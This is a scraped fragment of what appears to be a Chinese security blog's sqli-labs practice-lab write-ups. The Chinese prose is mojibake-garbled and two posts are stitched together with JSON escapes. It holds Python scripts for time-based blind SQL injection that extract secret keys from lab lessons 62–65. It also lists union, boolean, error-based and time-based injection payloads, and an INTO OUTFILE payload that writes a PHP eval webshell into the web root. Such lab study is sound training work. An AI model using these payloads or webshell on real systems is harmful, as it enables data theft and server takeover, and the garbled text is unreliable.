\u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; //\tprint_r(mysql_error());  echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } å› ä¸ºæ³¨é‡Šäº†print_r(mysql_error())ï¼Œæ— æ³•ç”¨æŠ¥é”™æ³¨å…¥ã€‚å› ä¸ºè¿˜æœ‰å°è¯•æ¬¡æ•°ï¼Œåªèƒ½ç”¨å»¶æ—¶æ³¨å…¥\nå†™äº†ä¸€ä¸‹ jio æœ¬ï¼Œå†™çš„æ¯”è¾ƒæ¸£\n# encoding: utf-8 import requests import re index_url = \u0026#34;http://localhost:8081/Less-62/index.php?id=\u0026#34; header = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, } cookie = { \u0026#39;challenge\u0026#39;:\u0026#39;7b4184899f8b788841fb3eaf29177fdc\u0026#39;, \u0026#39;PHPSESSID\u0026#39;:\u0026#39;a64htnnoo54e99q0005mareng7\u0026#39; } flag = \u0026#39;\u0026#39; # for i in range(1,11): # print(i) # for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: # j = ord(j) # # payload = \u0026#34;0\u0026#39;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;challenges\u0026#39;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; # url = index_url + payload # try: # r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # # print(r.text) # except: # flag += chr(j) # print(flag) # break # flag = \u0026#39;secret_\u0026#39; # for i in range(8,12): # print(i) # for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: # j = ord(j) # payload = \u0026#34;0\u0026#39;) or if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#39;WMBY8Y9EUL\u0026#39; limit 2,1),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; # url = index_url + payload # try: # r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # # print(r.text) # except: # flag += chr(j) # print(flag) # break #secret_WPTM for i in range(1,25): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm\u0026#39;: j = ord(j) payload = \u0026#34;0\u0026#39;) or if((ascii(substr((select secret_WPTM from WMBY8Y9EUL),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break #mtvo4Z0u4wqd0nLRwxnydled Less-63 $sql=\u0026#34;SELECT * FROM security.users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; //\tprint_r(mysql_error());  echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } # encoding: utf-8 import requests import re index_url = \u0026#34;http://localhost:8081/Less-63/index.php?id=\u0026#34; header = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, } cookie = { \u0026#39;challenge\u0026#39;:\u0026#39;31a6b5568bbb9c350c1b296d9086acf0\u0026#39;, \u0026#39;PHPSESSID\u0026#39;:\u0026#39;a64htnnoo54e99q0005mareng7\u0026#39; } flag = \u0026#39;\u0026#39; table = \u0026#39;\u0026#39; column = \u0026#39;\u0026#39; for i in range(1,11): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: j = ord(j) payload = \u0026#34;0\u0026#39; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;challenges\u0026#39;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) except: flag += chr(j) print(flag) break table = flag print(\u0026#34;################################# table is %s\u0026#34; % table) flag = \u0026#39;secret_\u0026#39; for i in range(8,12): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: j = ord(j) payload = \u0026#34;0\u0026#39; or if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#39;\u0026#34;+ table +\u0026#34;\u0026#39; limit 2,1),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break column = flag print(\u0026#34;################################# column is %s\u0026#34; % column) flag = \u0026#39;\u0026#39; for i in range(1,25): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm\u0026#39;: j = ord(j) payload = \u0026#34;0\u0026#39; or if((ascii(substr((select \u0026#34;+ column +\u0026#34; from \u0026#34;+ table +\u0026#34;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break print(\u0026#34;################################# key is %s\u0026#34; % flag) Less-64 // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; //\tprint_r(mysql_error());  echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } # encoding: utf-8 import requests import re index_url = \u0026#34;http://localhost:8081/Less-64/index.php?id=\u0026#34; header = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, } cookie = { \u0026#39;challenge\u0026#39;:\u0026#39;6efa4aae76d29c330a3636356fa5386c\u0026#39;, \u0026#39;PHPSESSID\u0026#39;:\u0026#39;a64htnnoo54e99q0005mareng7\u0026#39; } flag = \u0026#39;\u0026#39; table = \u0026#39;\u0026#39; column = \u0026#39;\u0026#39; for i in range(1,11): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: j = ord(j) payload = \u0026#34;0)) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;challenges\u0026#39;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) except: flag += chr(j) print(flag) break table = flag print(\u0026#34;################################# table is %s\u0026#34; % table) flag = \u0026#39;secret_\u0026#39; for i in range(8,12): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: j = ord(j) payload = \u0026#34;0)) or if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#39;\u0026#34;+ table +\u0026#34;\u0026#39; limit 2,1),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break column = flag print(\u0026#34;################################# column is %s\u0026#34; % column) flag = \u0026#39;\u0026#39; for i in range(1,25): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm\u0026#39;: j = ord(j) payload = \u0026#34;0)) or if((ascii(substr((select \u0026#34;+ column +\u0026#34; from \u0026#34;+ table +\u0026#34;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break print(\u0026#34;################################# key is %s\u0026#34; % flag) Less-65 $id = \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; //\tprint_r(mysql_error());  echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } # encoding: utf-8 import requests import re index_url = \u0026#34;http://localhost:8081/Less-65/index.php?id=\u0026#34; header = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, } cookie = { \u0026#39;challenge\u0026#39;:\u0026#39;caf415945acc41218462264d7e211f37\u0026#39;, \u0026#39;PHPSESSID\u0026#39;:\u0026#39;a64htnnoo54e99q0005mareng7\u0026#39; } flag = \u0026#39;\u0026#39; table = \u0026#39;\u0026#39; column = \u0026#39;\u0026#39; for i in range(1,11): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: j = ord(j) payload = \u0026#34;0\\\u0026#34;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;challenges\u0026#39;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) except: flag += chr(j) print(flag) break table = flag print(\u0026#34;################################# table is %s\u0026#34; % table) flag = \u0026#39;secret_\u0026#39; for i in range(8,12): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890\u0026#39;: j = ord(j) payload = \u0026#34;0\\\u0026#34;) or if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#39;\u0026#34;+ table +\u0026#34;\u0026#39; limit 2,1),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break column = flag print(\u0026#34;################################# column is %s\u0026#34; % column) flag = \u0026#39;\u0026#39; for i in range(1,25): print(i) for j in \u0026#39;QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm\u0026#39;: j = ord(j) payload = \u0026#34;0\\\u0026#34;) or if((ascii(substr((select \u0026#34;+ column +\u0026#34; from \u0026#34;+ table +\u0026#34;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break print(\u0026#34;################################# key is %s\u0026#34; % flag) ","date":"2019-03-04T23:23:34Z","permalink":"https://blog.zeddyu.info/2019/03/04/Sqli-lab-Challenges-Write-up/","title":"Sqli-lab Challenges Write up"},{"content":"ä¹‹å‰å¾ˆæ—©å†™çš„ï¼Œè¿™å‡ å¤©æŠŠå®ƒè¡¥é½äº†ã€‚\n[TOC]\nPreparation ä¸ºäº†ä¸å¹²æ‰°è‡ªå·±æœ¬æœºç¯å¢ƒï¼Œsql-labæˆ‘å°±ç”¨çš„dockerè·‘èµ·æ¥çš„ï¼Œæ­å»ºä¹Ÿéå¸¸ç®€å•ï¼Œä¹Ÿå°±ä¸¤æ¡å‘½ä»¤\ndocker pull acgpiano/sqli-labs docker run -dt --name sqli-lab -p [ä½ è¦æ˜ å°„çš„ç«¯å£]:80 acgpiano/sqli-labs:latest ç„¶ååœ¨sql-labä¸Šç›´æ¥åˆå§‹åŒ–æ•°æ®åº“å°±å¥½äº†ã€‚\nBasic è¿™é‡Œåˆ—ä¸¾ä¸€ä¸‹sqlåŸºç¡€è¯­å¥\nshowdatabases;//æŸ¥çœ‹æ•°æ®åº“usexxx;//ä½¿ç”¨æŸä¸ªæ•°æ®åº“showtables;//æŸ¥çœ‹è¯¥æ•°æ®åº“çš„æ•°æ®è¡¨descxxx;//æŸ¥çœ‹è¯¥æ•°æ®è¡¨çš„ç»“æ„select*fromxxx;//æŸ¥æ‰¾æŸä¸ªæ•°æ®è¡¨çš„æ‰€æœ‰å†…å®¹selectschema_namefrominformation_schema.schemata;//çŒœæ•°æ®åº“selecttable_namefrominformation_schema.tableswheretable_schema=\u0026#39;xxxxx\u0026#39;;//çŒœæŸæ•°æ®åº“çš„æ•°æ®è¡¨Selectcolumn_namefrominformation_schema.columnswheretable_name=\u0026#39;xxxxx\u0026#39;;//çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—left(a,b)//ä»å·¦ä¾§æˆªå–açš„å‰bä½mid(column_name,start[,length])//ä»ä½ç½®startå¼€å§‹ï¼Œæˆªå–column_nameå­—ç¬¦ä¸²çš„lengthä½ï¼Œä¸substrä½œç”¨ç›¸åŒsubstr(string,start,length)//ä»ä½ç½®startå¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²stringçš„lengthé•¿åº¦ï¼Œä¸midä½œç”¨ç›¸åŒascii()//å°†æŸä¸ªå­—ç¬¦è½¬æ¢æˆasciiç ord()//å°†æŸä¸ªå­—ç¬¦è½¬æ¢æˆasciiç ï¼ŒåŒascii()SQLi-LABS Page-1(Basic Challenges) Less-1 å°è¯•æ·»åŠ \u0026rsquo;æ³¨å…¥ï¼Œå‘ç°æŠ¥é”™\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å‘ç°æŠ¥é”™çš„åœ°æ–¹ï¼Œç›´æ¥å°†åé¢æ³¨é‡Šï¼Œç„¶åä½¿ç”¨\n1\u0026#39; order by 3%23 //å¾—åˆ°åˆ—æ•°ä¸º3 //è¿™é‡Œç”¨-1æ˜¯ä¸ºäº†æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„id,å¥½è®©ç¬¬ä¸€å¥ç»“æœä¸ºç©ºï¼Œç›´æ¥æ˜¾ç¤ºç¬¬äºŒå¥çš„ç»“æœ -1\u0026#39;unionselect1,2,group_concat(schema_name)frominformation_schema.schemata%23//å¾—åˆ°æ•°æ®åº“å-1\u0026#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= \u0026#39;security\u0026#39;# //å¾—åˆ°è¡¨å -1\u0026#39;unionselect1,group_concat(column_name),3frominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;#//å¾—åˆ°åˆ—å-1\u0026#39; union select 1,username,password from users where id=3# //çˆ†ç ´å¾—åˆ°æ•°æ® Less-2 åœ¨æ·»åŠ \u0026rsquo;ä¹‹åï¼Œå¾—åˆ°è¿”å›\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 å¯ä»¥å¾—åˆ°è¿™ä¸ªsqlè¯­å¥å…¶å®å¹¶æ²¡æœ‰å•å¼•å·ï¼Œåªæ˜¯ç”¨æ•°å­—è¿›è¡ŒæŸ¥è¯¢ï¼Œä¾‹å¦‚\nselect * from users where id=1 æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥è·Ÿä¸Šé¢ä¸€æ ·ï¼Œpayloads:\n-1or1=1%23Less-3 æ·»åŠ \u0026rsquo;ä¹‹åï¼Œè¿”å›\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1 å¯ä»¥å¾—åˆ°å¤§æ¦‚çš„sqlè¯­å¥:\nselect*fromuserswhereid=(\u0026#39;input\u0026#39;)LIMIT0,1;æ‰€ä»¥æˆ‘ä»¬å¯ä»¥éœ€è¦é—­åˆ)ã€‚\n-1\u0026#39;) or 1=1%23 Less-4 å°è¯•\u0026rsquo;å¹¶æœªå‘ç°æŠ¥é”™ï¼Œå°è¯•\u0026quot;å‘ç°æŠ¥é”™\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\u0026quot;1\u0026quot;\u0026quot;) LIMIT 0,1' at line 1 å¯ä»¥å¾—åˆ°å¤§æ¦‚çš„sqlè¯­å¥\nselect*fromuserswhereid=(\u0026#34;input\u0026#34;)LIMIT0,1;æ‰€ä»¥payload:\n-1\u0026#34;) or 1=1 %23 å…¶ä»–æ³¨å…¥è¯­å¥åŒä¸Š ï¼Œå°±ä¸å†ä¸€ä¸€åˆ—ä¸¾äº†ã€‚\nLess-5 å°è¯•\u0026rsquo;å‘ç°æŠ¥é”™\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 çŒœæµ‹sqlè¯­å¥ä¸º\nselect*fromuserswhereid=\u0026#39;input\u0026#39;LIMIT0,1;å¦‚æœå°è¯•ä¹‹å‰çš„æ³¨å…¥æ–¹æ³•ï¼Œä¼šå‘ç°ä¸å†ä¼šè¿”å›æˆ‘ä»¬æ³¨å…¥çš„ä¿¡æ¯ï¼Œå¦‚æœæ³¨å…¥æˆåŠŸçš„è¯ï¼Œé¡µé¢ä¼šè¿”å›You are in...ï¼Œå‡ºé”™çš„è¯å°±ä¸ä¼šè¿”å›è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œç›²æ³¨ã€‚\nä½¿ç”¨left() ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨1' and left(version(),1)=3%23è¿™ä¸ªpayloadè¿›è¡Œæµ‹è¯•ï¼Œæˆªå–version()å¾—åˆ°çš„æœ€å·¦ä¾§çš„å­—ç¬¦åˆ¤æ–­æ˜¯å¦ä¸º3ï¼Œå¦‚æœä¸º3åˆ™æ­£å¸¸è¿”å›You are in...ï¼Œå¦åˆ™ä¸è¿”å›ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¸€æ­¥ä¸€æ­¥çˆ†ç ´å¾—åˆ°left(version(),1)=5ã€‚çˆ†ç ´åŒºé—´å¯ä»¥ç¡®å®šåœ¨/[0-9.]/ã€‚\né‡‡ç”¨1'and length(database())=8%23å¯¹æ•°æ®åº“åå­—é•¿åº¦è¿›è¡Œçˆ†ç ´ï¼Œç¡®å®šæ•°æ®åº“åå­—é•¿åº¦ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨database()æ¥è¿›è¡Œçˆ†ç ´æ•°æ®åº“åï¼Œé‡‡ç”¨left(database(),1)\u0026gt;'a'è¿™ä¸ªpayloadè¿›è¡Œæµ‹è¯•ï¼ŒåŸç†è·Ÿä¸Šè¿°ä¸€è‡´ï¼Œçœ‹è¿”å›å³å¯ï¼Œç›´åˆ°æˆªå–é•¿åº¦ä¸æ•°æ®åº“åå­—ä¸€è‡´ä¸ºæ­¢ï¼Œè¿™é‡Œæ•ˆç‡æ¯”è¾ƒé«˜çš„å°±æ˜¯é‡‡ç”¨äºŒåˆ†æ³•è¿›è¡Œç›²æ³¨ã€‚\nä½¿ç”¨substr()ã€ascii() ä¹Ÿå¯ä»¥é‡‡ç”¨substr()ã€ascii()å‡½æ•°è¿›è¡Œå°è¯•:\n1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026gt;80%23 //æˆªå–æ•°æ®åº“ä¸‹ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸80asciiå€¼è¿›è¡Œå¯¹æ¯” æ‰¾ç¬¬äºŒä¸ªå­—ç¬¦åªéœ€è¦æ”¹æˆsubstr(\u0026#39;xxx\u0026#39;,2,1)å³å¯ã€‚ æ‰¾ç¬¬äºŒä¸ªè¡¨æ”¹æˆlimit 1,1 ä½¿ç”¨regexp() 1\u0026#39; and 1=(select 1 from information_schema.columns where table_name=\u0026#39;users\u0026#39; and column_name regexp \u0026#39;^us[a-z]\u0026#39; limit 0,1;)%23 //usersè¡¨ä¸­çš„åˆ—åæ˜¯å¦æœ‰us**çš„åˆ— ä½¿ç”¨ord()ã€mid() 1\u0026#39; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68%23 //cast(username AS CHAR)å°†usernameè½¬æ¢æˆå­—ç¬¦ä¸² //IFNULL(exp1,exp2)å‡å¦‚expr1ä¸ä¸ºNULLï¼Œåˆ™IFNULL()çš„è¿”å›å€¼ä¸ºexpr1; å¦åˆ™å…¶è¿”å›å€¼ä¸ºexpr2ã€‚IFNULL()çš„è¿”å›å€¼æ˜¯æ•°å­—æˆ–æ˜¯å­—ç¬¦ä¸²ï¼Œå…·ä½“æƒ…å†µå–å†³äºå…¶æ‰€ä½¿ç”¨çš„è¯­å¢ƒã€‚ //ordå‰æ–‡æè¿‡ ä½¿ç”¨æŠ¥é”™æ³¨å…¥ æ¨èä¸€ç¯‡è¶…è¯¦ç»†çš„è®²è§£æŠ¥é”™æ³¨å…¥çš„æ–‡ç« â€”â€”MysqlæŠ¥é”™æ³¨å…¥åŸç†åˆ†æ(count()ã€rand()ã€group by)\n1\u0026#39; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+ 1\u0026#39;unionselect1,count(*),concat((selectuser()),floor(rand(0)*2))xfromsecurity.usersgroupbyx#1\u0026#39; union select (!(select * from (select user())x) - ~0),2,3 --+ 1\u0026#39;andextractvalue(1,concat(0x7e,(select@@version),0x7e))--+ 1\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+ 1\u0026#39;unionselect1,2,3from(selectNAME_CONST(version(),1),NAME_CONST(version(),1))x--+ ä½¿ç”¨å»¶æ—¶æ³¨å…¥ benchmark æ˜¯Mysqlçš„ä¸€ä¸ªå†…ç½®å‡½æ•°,å…¶ä½œç”¨æ˜¯æ¥æµ‹è¯•ä¸€äº›å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦ã€‚ benchmark() ä¸­å¸¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…æ˜¯è¡¨è¾¾å¼\n1\u0026#39;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 1\u0026#39;UNIONSELECT(IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(\u0026#39;MSG\u0026#39;,\u0026#39;by 5 seconds\u0026#39;)),null)),2,3FROM(selectdatabase()ascurrent)astb1--+ Less-6 æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨\n1\u0026#34; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026gt;100--+ å¯ä»¥å‘ç°\u0026gt;100æœ‰å›æ˜¾ï¼Œå°äºå°±æ²¡æœ‰ï¼Œä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥â€¦\nè¿™é‡Œå°±æ˜¯æŠŠLess-5 ä¸­çš„'æ”¹æˆ\u0026quot;å°±è¡Œäº†\nLess-7 ä½¿ç”¨æ–‡ä»¶å¯¼å‡º\n1\u0026#39;))UNION SELECT 1,2,3 into outfile \u0026#34;c:\\\\wamp\\\\www\\\\sqlli b\\\\Less-7\\\\uuu.txt\u0026#34;%23 1\u0026#39;))UNIONSELECT1,2,\u0026#39;\u0026lt;?php @eval($_post[â€œmimaâ€])?\u0026gt;\u0026#39;intooutfile\u0026#34;c:\\\\wamp\\\\www\\\\sqllib\\\\Less-7\\\\yijuhua.php\u0026#34;--+ Less-8 å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œä¹Ÿå¯ä»¥ç”¨ bool ç›²æ³¨\n1\u0026#39; and If(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))--+ Less-9 åŒ Less-8 å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨\n1\u0026#39; and If(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))--+ Less-10 1\u0026#34; and If(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))--+ Less-11 æŠ¥é”™æ³¨å…¥ï¼Œå°‘ä¸€åˆ—å°±è¡Œäº†\n1\u0026#39; union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a# 1\u0026#39;unionselectcount(*),concat((selectuser()),floor(rand(0)*2))xfrominformation_schema.columnsgroupbyx#Less-12 1\u0026#34;) union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a# 